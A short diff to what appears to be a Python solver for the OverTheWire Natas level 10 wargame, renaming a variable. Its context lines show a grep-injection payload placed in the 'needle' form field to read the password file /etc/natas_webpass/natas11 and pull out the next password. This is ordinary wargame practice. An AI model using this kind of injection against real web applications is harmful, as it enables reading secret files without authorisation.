@@ -17,8 +17,8 @@ def get_natas11_password(natas10_password):
     for character in characters:
         payload = f"{character} /etc/natas_webpass/natas11"
         data = {"needle": payload, "submit": "true"}
-        request = session.post(URL, data=data)
-        passwords = re.findall(r'([a-zA-Z\d]{32})', request.text)
+        response = session.post(URL, data=data)
+        passwords = re.findall(r'([a-zA-Z\d]{32})', response.text)
         if len(passwords) > 1:
             natas11_password = passwords[1]
             break
